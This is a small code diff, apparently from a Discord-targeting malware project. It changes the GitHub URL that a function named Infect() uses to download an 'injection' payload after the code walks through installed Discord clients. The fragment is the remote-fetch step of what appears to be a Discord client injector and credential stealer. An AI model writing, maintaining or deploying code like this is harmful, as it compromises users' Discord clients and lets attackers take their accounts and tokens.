@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/dotnoxty/Delirium/main/Injection/injection-clean', (resp) => {
+    https.get('https://raw.githubusercontent.com/dotnoxty/delirium.gg/main/delirium/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
